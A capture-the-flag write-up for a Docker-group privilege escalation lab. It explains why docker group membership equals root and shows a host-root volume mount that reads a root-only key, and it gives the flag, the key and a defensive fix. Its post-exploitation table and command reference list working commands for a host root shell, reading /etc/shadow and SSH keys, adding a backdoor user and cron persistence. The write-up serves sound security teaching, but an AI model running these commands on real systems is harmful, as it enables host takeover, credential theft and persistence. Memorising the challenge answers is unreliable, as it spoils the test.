# L05 · Act I · Privilege Escalation — Root By Membership

**MITRE tag:** T1548 — Abuse Elevation Control Mechanism  
**Challenge type:** Docker group membership → host filesystem access  
**Flag:** `bl_1188ac43c578962c8519653cf74f1bcf`  
**SSH:** `pe-docker@204.168.229.209 -p 2224`

---

## Challenge brief

> *"Your user belongs to a group that was meant to be convenient. Certain memberships are root by design, and the control socket does the rest. The box has no network, so use the image already loaded on it. A direct rehearsal for the cloud track."*

The user `operator` is a member of the `docker` group. No other interesting memberships. The Docker daemon is running. One image is pre-loaded. The goal: use group membership to read a root-only file, write it to `/tmp/.pe-docker-proof`, and run `verify`.

---

## Building the concepts

There are four ideas to understand before the exploit makes sense:

1. What Unix domain sockets are and how they work
2. How Docker's client-daemon architecture uses one
3. Why `docker` group membership = root-equivalent access
4. Why a volume mount breaks container isolation

---

### Concept 1 — Unix domain sockets

You are probably familiar with **TCP sockets** — a program opens a connection to a host:port address (like `192.168.1.1:8080`) and data flows over the network. A **Unix domain socket** is similar but local only: instead of an IP address, it uses a **file path** on the filesystem.

A Unix domain socket is literally a file. You can see it with `ls`:

```bash
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 Oct 24 ... /var/run/docker.sock
```

The `s` at the front of the permissions means "socket file." Programs that want to talk to the service behind this socket open this file and exchange messages through it — without any network involved.

**The critical property:** access to a socket file = access to the service behind it. The socket is the front door. The file's permissions control who can knock on that door:

```
srw-rw---- 1 root docker ...
            |   |   |
            |   |   └── group 'docker' can read and write
            |   └────── owner 'root' can read and write
            └─────────── others: no access
```

Only root and members of the `docker` group can send messages to this socket.

---

### Concept 2 — Docker's client-daemon architecture

Docker is not a single program. It is split into two pieces:

```
You (lowpriv user)
    |
    | runs
    v
docker CLI           ← the command you type: "docker run ...", "docker images ..."
    |
    | sends requests over
    v
/var/run/docker.sock ← the Unix domain socket file
    |
    | forwards to
    v
dockerd (Docker daemon) ← the actual service that manages containers
    |                      RUNS AS ROOT
    | talks to
    v
Linux kernel (namespaces, cgroups, overlay filesystem)
```

When you type `docker run alpine sh`, the CLI sends an instruction to the daemon through the socket. The daemon (running as root) does the actual work: pulling images, creating namespaces, starting the container process.

**The key point:** the daemon runs as root. It has full control over the kernel, all files, all processes. When you can reach the daemon (via the socket), you are telling root what to do.

---

### Concept 3 — Why the `docker` group is root-equivalent

This follows directly from concepts 1 and 2:

- The socket file is owned `root:docker` with `srw-rw----`
- Members of the `docker` group can write to the socket
- Writing to the socket = sending instructions to the daemon
- The daemon executes those instructions as root

**There is no permission boundary between the docker group and root.** Anything root can do (read any file, write to any file, create processes as any user), a docker group member can do — they just have to phrase it as a docker instruction instead of a direct command.

This is why Docker's own documentation says:

> "The docker group grants privileges equivalent to the root user."

Adding a user to the `docker` group for convenience (so they do not have to type `sudo docker`) is equivalent to giving them a root shell. Many developers do not realize this.

---

### Concept 4 — Volume mounts and the isolation promise

Containers appear isolated: they have their own filesystem, their own processes, their own network. This isolation is provided by Linux kernel features (namespaces). A container process cannot normally see the host's files because it is in a separate filesystem namespace.

A **volume mount** (`-v`) deliberately breaks this isolation for a specific path. When you run:

```bash
docker run -v /some/host/path:/container/path image
```

The host directory `/some/host/path` appears inside the container at `/container/path`. The container's process can read and write it as if it were a local directory.

**Now: who owns files inside the container?**

By default, Docker containers run processes as **UID 0 (root) inside the container**. On a standard Docker setup (without user namespace remapping), UID 0 inside the container maps directly to UID 0 on the host. The kernel does not care that the process is "inside a container" — when a process with UID 0 opens a file, it gets root-level access.

So the chain is:

```
docker group member
    |
    | instructs daemon
    v
daemon creates container with UID 0 process
    |
    | mounts /host = host's /
    v
container process (UID 0) reads /host/root/.pe-docker-key
    |
    = same as root reading /root/.pe-docker-key on the host
```

No vulnerability in the kernel. No CVE. Just the designed behavior of volume mounts combined with the designed behavior of docker group access.

---

## The correct approach

```bash
# 1. Confirm docker group membership
id
# → gid=2375(docker) — that's all we need

# 2. Check what images are available (no network means we must use what's here)
docker images
# → phantom/host-reader:1

# 3. Mount the host filesystem and read the key
docker run --rm -v /:/host phantom/host-reader:1 cat /host/root/.pe-docker-key

# 4. Write proof and verify
echo "<key>" > /tmp/.pe-docker-proof
verify
```

---

## Enumeration log

### Step 1 — Check who we are

```bash
id
```

**Result:** `uid=11(operator) gid=2375(docker) groups=2375(docker)`

**Conclusion:** The user's primary group IS docker — not even a supplementary group. No other memberships. The docker socket is the entire attack surface.

---

### Step 2 — Confirm the Docker daemon is running and list images

```bash
docker images
```

**Result:**
```
REPOSITORY            TAG   IMAGE ID       CREATED        SIZE
phantom/host-reader   1     d3d7f1f0e922   2 minutes ago  1.21MB
```

**Conclusion:** One image, 1.21 MB — a minimal Alpine or scratch base. The challenge says no network, so we cannot pull anything from Docker Hub. We work with this image.

---

### Step 3 — Read the key via a mounted container

```bash
docker run --rm -v /:/host phantom/host-reader:1 cat /host/root/.pe-docker-key
```

**What each part does:**

| Part | Meaning |
|---|---|
| `docker run` | Tell the daemon to create and start a container |
| `--rm` | Remove the container automatically when it exits |
| `-v /:/host` | Mount the host's `/` (entire filesystem) at `/host` inside the container |
| `phantom/host-reader:1` | Use this local image |
| `cat /host/root/.pe-docker-key` | Inside the container, read the key through the mount |

**Result:** `ccb332ad485bf2ad7eac0ab36321b37c`

The process ran as UID 0 inside the container. The mounted path `/host/root/` maps to the host's `/root/`, which is owned root with mode 700. UID 0 inside the container = UID 0 on the host = root. File read succeeds.

---

### Step 4 — Write proof and verify

```bash
echo "ccb332ad485bf2ad7eac0ab36321b37c" > /tmp/.pe-docker-proof
verify
```

**Result:**
```
Level solved: pe-docker-group
Your flag: bl_1188ac43c578962c8519653cf74f1bcf
```

---

## What the vulnerability was

The vulnerability is not a bug. It is a misconfiguration: adding `operator` to the `docker` group to make Docker convenient, without recognizing that `docker` group membership is functionally identical to root access.

The intended use case for the docker group is for developer machines where the developer is already trusted with the machine. It is not appropriate on a shared server, a production host, or anywhere the user should not have root.

**What else could be done with this access** (beyond reading one file):

| What | How |
|---|---|
| Interactive root shell on host | `docker run --rm -it -v /:/host phantom/host-reader:1 chroot /host sh` |
| Read any host file | `-v /:/host` + `cat /host/path/to/file` |
| Write to host filesystem | `-v /:/host` + shell command that writes to `/host/...` |
| Add a backdoor user | Write to `/host/etc/passwd` |
| Establish persistence | Write to `/host/etc/cron.d/` |
| Read all password hashes | `cat /host/etc/shadow` |
| Read root's SSH key | `cat /host/root/.ssh/id_rsa` |

The mount gives the container process unrestricted read/write access to the entire host filesystem as root. The only limit is that you cannot run host binaries directly from inside the container without `chroot`.

### The `chroot` path — interactive root shell

If you want a full interactive root shell on the host, not just a file read:

```bash
docker run --rm -it -v /:/host phantom/host-reader:1 chroot /host sh
```

`chroot /host sh` makes the container's root the host's filesystem and opens a shell. You are now running a shell with the host's `/etc`, `/root`, `/home`, and everything else as the root.

---

### Why this appears in the cloud track

In Kubernetes, the equivalent is mounting the host's Docker or container runtime socket inside a pod, or running a privileged pod. If a pod can communicate with the container runtime socket, the pod can escape to the host node in exactly the same way shown here. This is a common finding in misconfigured Kubernetes clusters and cloud-managed container environments.

The same logic applies to other container runtimes:
- Podman uses a similar socket (`/run/podman/podman.sock`)
- containerd uses `/run/containerd/containerd.sock`
- CRI-O uses `/var/run/crio/crio.sock`

Any of these sockets, if accessible to a non-root user or mounted into a container, give the same root-equivalent access.

---

### The defender's fix

**Do not add users to the `docker` group.** If users need to run Docker commands without sudo, the correct alternatives are:

| Option | What it does |
|---|---|
| `sudo docker` with specific commands allowed | Grants only the specific docker commands needed, logged |
| Rootless Docker | Runs dockerd as the user's own UID — volume mounts still show only their own files, not root's |
| Podman (rootless by default) | Runs containers as the current user; host mounts show only the user's permissions |

For production servers, no non-root user should be in the `docker` group.

---

## Carryover findings

None.

---

## Dead ends

None. The attack path was direct: confirm group membership, list images, mount and read.

---

## Command reference

```bash
# Check group membership
id

# Check if Docker daemon is running
docker info 2>/dev/null | head -5

# List available images (no network pull needed if image is local)
docker images

# Read a root-only file from the host via a container mount
docker run --rm -v /:/host <image> cat /host/root/<file>

# Get an interactive root shell on the host filesystem
docker run --rm -it -v /:/host <image> chroot /host sh

# Read /etc/shadow from host (get password hashes)
docker run --rm -v /:/host <image> cat /host/etc/shadow

# Write to host filesystem (e.g. add a cron job)
docker run --rm -v /:/host <image> sh -c 'echo "* * * * * root <cmd>" >> /host/etc/cron.d/backdoor'

# Check what socket Docker uses (confirm it is the Unix socket, not TCP)
ls -la /var/run/docker.sock
```